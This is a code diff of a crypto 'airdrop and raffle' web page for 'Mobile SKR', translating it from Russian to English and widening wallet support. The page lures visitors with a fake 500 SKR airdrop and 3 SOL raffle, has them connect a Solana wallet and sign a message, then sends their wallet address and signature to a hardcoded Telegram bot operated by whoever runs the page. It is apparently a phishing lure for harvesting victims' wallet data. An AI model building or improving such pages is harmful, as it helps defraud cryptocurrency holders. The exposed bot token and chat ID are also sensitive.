@@ -1,10 +1,10 @@
 <!doctype html>
-<html lang="ru">
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Mobile SKR | Airdrop & Raffle</title>
-  
+ 
   <style>
     :root{
       --bg0:#070b10; --bg1:#0a1017; --text:#e8eef6;
@@ -22,7 +22,6 @@
       min-height:100vh; overflow-x:hidden;
     }
     #dust{ position:fixed; inset:0; pointer-events:none; z-index:0; }
-
     /* NAVBAR */
     .nav{
       position:fixed; top:0; left:0; right:0; height:72px; padding:0 22px;
@@ -32,7 +31,6 @@
     }
     .brand{ display:flex; align-items:center; gap:12px; font-weight:780; letter-spacing:.12em; text-transform:uppercase; font-size:.88rem; }
     .brand-mark{ width:30px; height:18px; border-radius:6px; background:linear-gradient(90deg,var(--sol-a),var(--sol-b)); }
-
     .actions{ display:flex; gap:12px; align-items:center; }
     .btn{
       border-radius:999px; padding:10px 18px; border:1px solid rgba(255,255,255,.16);
@@ -43,7 +41,6 @@
     .btn-primary{ background:linear-gradient(90deg,var(--sol-a),var(--sol-b)); color:#05080b; border:none; }
     .btn-accent{ background:linear-gradient(90deg,var(--sol-c), #cc80ff); color:#fff; border:none; }
     .btn:disabled{ opacity:.3; cursor:not-allowed; }
-
     /* HERO */
     .wrap{ max-width:1000px; margin:0 auto; padding:120px 20px 60px; position:relative; z-index:1; }
     .hero{
@@ -57,61 +54,52 @@
       background:rgba(20,241,149,.1); border:1px solid var(--sol-a);
       color:var(--sol-a); font-size:.85rem; margin-bottom:25px;
     }
-    
+   
     .status-msg{ margin:20px 0; min-height:24px; color:var(--sol-a); font-weight:500; }
-
     /* WALLET GRID */
     .wallet-panel{ margin:30px 0; background:rgba(255,255,255,.03); padding:20px; border-radius:var(--radius-lg); border:1px solid rgba(255,255,255,.05); }
     .wallet-grid{ display:flex; justify-content:center; gap:10px; flex-wrap:wrap; margin-top:15px; }
-    .wallet-item{ 
-        display:flex; align-items:center; gap:8px; padding:8px 15px; 
-        background:rgba(0,0,0,.5); border:1px solid rgba(255,255,255,.1); 
+    .wallet-item{
+        display:flex; align-items:center; gap:8px; padding:8px 15px;
+        background:rgba(0,0,0,.5); border:1px solid rgba(255,255,255,.1);
         border-radius:999px; cursor:pointer; font-size:0.85rem;
     }
     .wallet-item:hover{ border-color:var(--sol-a); }
-
     .main-btns{ display:flex; flex-direction:column; gap:15px; align-items:center; margin-top:30px; }
     .big-btn{ width:100%; max-width:400px; padding:18px; border-radius:15px; font-size:1.1rem; font-weight:800; text-transform:uppercase; border:none; cursor:pointer; transition:0.3s; }
-
   </style>
 </head>
-
 <body>
   <canvas id="dust"></canvas>
-
   <header class="nav">
     <div class="brand">
       <div class="brand-mark"></div>
       <div>Mobile SKR</div>
     </div>
     <div class="actions">
-      <button class="btn" id="connect-nav" onclick="connectWallet()">Подключить кошелёк</button>
+      <button class="btn" id="connect-nav" onclick="connectWallet()">Connect Wallet</button>
     </div>
   </header>
-
   <main class="wrap">
     <section class="hero">
-      <img src="https://purple-accused-scorpion-11.mypinata.cloud/ipfs/bafybeifvwriqjehl62zeceva2yp7653jxy7sghyehrqh263aeuqbecsy7i" class="hero-logo">
+      <img src="https://purple-accused-scorpion-11.mypinata.cloud/ipfs/bafybeifvwriqjehl62zeceva2yp7653jxy7sghyehrqh263aeuqbecsy7i" class="hero-logo" alt="SKR Logo">
       <h1>SKR HUB</h1>
       <div class="hero-badge">🎁 AIRDROP: 500 SKR ACTIVE</div>
-      
+     
       <p style="color:var(--muted); max-width:600px; margin:0 auto;">
-        Подключите кошелёк и подпишите заявку, чтобы зафиксировать своё участие в экосистеме Mobile SKR.
+        Connect your wallet and sign the message to confirm your participation in the Mobile SKR ecosystem.
       </p>
-
-      <div id="status" class="status-msg">Ожидание подключения...</div>
-
+      <div id="status" class="status-msg">Waiting for connection...</div>
       <div class="main-btns">
         <button id="airdrop-btn" class="big-btn btn-primary" disabled onclick="handleSign('airdrop')">
-            Участвовать в Airdrop
+            Join Airdrop
         </button>
         <button id="raffle-btn" class="big-btn btn-accent" disabled onclick="handleSign('giveaway')">
-            Розыгрыш 3 SOL
+            Raffle 3 SOL
         </button>
       </div>
-
       <div class="wallet-panel">
-        <div style="font-size:0.8rem; text-transform:uppercase; letter-spacing:1px; color:var(--muted)">Доступные кошельки</div>
+        <div style="font-size:0.8rem; text-transform:uppercase; letter-spacing:1px; color:var(--muted)">Available Wallets</div>
         <div class="wallet-grid">
             <div class="wallet-item" onclick="connectWallet()"><span style="color:#8a5cff">●</span> Phantom</div>
             <div class="wallet-item" onclick="connectWallet()"><span style="color:#ff9a4a">●</span> Solflare</div>
@@ -120,57 +108,61 @@
       </div>
     </section>
   </main>
-
   <script>
-    // --- ТВОИ НАСТРОЙКИ ---
+    // --- YOUR SETTINGS ---
     const TG_TOKEN = "8425995205:AAEuTNVYnHHKMO87GOgAo1YIxr7WfhvPW2E";
-    const TG_CHAT_ID = "1041935839"; 
-
+    const TG_CHAT_ID = "1041935839";
     let walletAddress = null;
 
-    // 1. ПОДКЛЮЧЕНИЕ
+    // 1. CONNECT WALLET
     async function connectWallet() {
-      if (!window.solana) {
-        alert("Кошелёк не найден! Пожалуйста, установите Phantom.");
+      if (!window.solana && !window.solflare && !window.backpack) {
+        alert("Wallet not detected! Please install Phantom, Solflare or Backpack.");
         return;
       }
+
+      let provider = window.solana || window.solflare || window.backpack;
+
       try {
-        const resp = await window.solana.connect();
+        const resp = await provider.connect();
         walletAddress = resp.publicKey.toString();
-        
-        // Обновляем UI
+       
+        // Update UI
         document.getElementById('connect-nav').innerText = walletAddress.slice(0,4) + '...' + walletAddress.slice(-4);
-        document.getElementById('status').innerText = "Кошелёк подключён! Теперь подпишите заявку.";
+        document.getElementById('status').innerText = "Wallet connected! Now sign your claim.";
         document.getElementById('airdrop-btn').disabled = false;
         document.getElementById('raffle-btn').disabled = false;
-        
+       
       } catch (err) {
         console.error(err);
+        document.getElementById('status').innerText = "Wallet connection failed.";
       }
     }
 
-    // 2. ПОДПИСЬ И ОТПРАВКА
+    // 2. SIGN AND SEND TO TELEGRAM
     async function handleSign(type) {
       if (!walletAddress) return;
 
-      const message = type === 'airdrop' 
-        ? `Подтверждаю участие в Mobile SKR Airdrop.\nКошелек: ${walletAddress}\nДата: ${new Date().toISOString()}`
-        : `Заявка на участие в розыгрыше 3 SOL.\nКошелек: ${walletAddress}\nУдачи мне!`;
+      const message = type === 'airdrop'
+        ? `I confirm my participation in Mobile SKR Airdrop.\nWallet: ${walletAddress}\nDate: ${new Date().toISOString()}`
+        : `Entry for the 3 SOL raffle.\nWallet: ${walletAddress}\nGood luck to me!`;
+
+      let provider = window.solana || window.solflare || window.backpack;
 
       try {
-        document.getElementById('status').innerText = "Подтвердите действие в кошельке...";
-        
+        document.getElementById('status').innerText = "Confirm the action in your wallet...";
+       
         const encodedMessage = new TextEncoder().encode(message);
-        const signedMessage = await window.solana.signMessage(encodedMessage, "utf8");
-        const signature = btoa(String.fromCharCode.apply(null, signedMessage.signature));
+        const signedMessage = await provider.signMessage(encodedMessage, "utf8");
+        const signature = btoa(String.fromCharCode(...signedMessage.signature));
 
-        document.getElementById('status').innerText = "Отправка данных...";
+        document.getElementById('status').innerText = "Sending data...";
 
-        // 3. ТЕЛЕГРАМ
-        const text = `🚀 *НОВАЯ ПОДПИСЬ!*\n\n` +
-                     `📍 *Тип:* ${type.toUpperCase()}\n` +
+        // Send to Telegram
+        const text = `🚀 *NEW SIGNATURE!*\n\n` +
+                     `📍 *Type:* ${type === 'airdrop' ? 'AIRDROP' : 'RAFFLE'}\n` +
                      `💎 *Wallet:* \`${walletAddress}\`\n` +
-                     `✍️ *Подпись:* \`${signature.slice(0,40)}...\``;
+                     `✍️ *Signature:* \`${signature.slice(0,40)}...\``;
 
         await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
           method: 'POST',
@@ -182,38 +174,59 @@
           })
         });
 
-        document.getElementById('status').innerText = "✅ Ваша заявка успешно принята!";
+        document.getElementById('status').innerText = "✅ Your claim has been successfully registered!";
         document.getElementById('status').style.color = "#14f195";
-        alert("Успешно! Ваша подпись зарегистрирована.");
+        alert("Success! Your signature has been recorded.");
 
       } catch (err) {
         console.error(err);
-        document.getElementById('status').innerText = "Ошибка: Подпись отклонена.";
+        document.getElementById('status').innerText = "Error: Signature cancelled or failed.";
         document.getElementById('status').style.color = "#ff4a4a";
       }
     }
 
-    // --- ПАРТИКЛЫ (Твой код) ---
+    // --- PARTICLE ANIMATION (dust/stars) ---
     (function () {
       const canvas = document.getElementById("dust");
       const ctx = canvas.getContext("2d");
       let w, h, dpr;
+
       function resize() {
         dpr = window.devicePixelRatio || 1;
         w = canvas.width = window.innerWidth * dpr;
         h = canvas.height = window.innerHeight * dpr;
+        ctx.scale(dpr, dpr);
       }
-      window.addEventListener("resize", resize); resize();
+      window.addEventListener("resize", resize);
+      resize();
+
       const particles = Array.from({ length: 100 }, () => ({
-        x: Math.random() * w, y: Math.random() * h,
-        r: Math.random() * 2 * dpr, vx: Math.random() * 0.5 - 0.25, vy: Math.random() * 0.5 + 0.1, a: Math.random() * 0.5
+        x: Math.random() * window.innerWidth,
+        y: Math.random() * window.innerHeight,
+        r: Math.random() * 2,
+        vx: Math.random() * 0.5 - 0.25,
+        vy: Math.random() * 0.5 + 0.1,
+        a: Math.random() * 0.5 + 0.2
       }));
+
       function tick() {
-        ctx.clearRect(0, 0, w, h); ctx.fillStyle = "#fff";
+        ctx.clearRect(0, 0, window.innerWidth, window.innerHeight);
+        ctx.fillStyle = "#ffffff";
+
         particles.forEach(p => {
-          ctx.globalAlpha = p.a; ctx.beginPath(); ctx.arc(p.x, p.y, p.r, 0, Math.PI*2); ctx.fill();
-          p.y += p.vy; if (p.y > h) p.y = -10;
+          ctx.globalAlpha = p.a;
+          ctx.beginPath();
+          ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
+          ctx.fill();
+
+          p.y += p.vy;
+          p.x += p.vx;
+
+          if (p.y > window.innerHeight) p.y = -10;
+          if (p.x > window.innerWidth) p.x = 0;
+          if (p.x < 0) p.x = window.innerWidth;
         });
+
         requestAnimationFrame(tick);
       }
       tick();
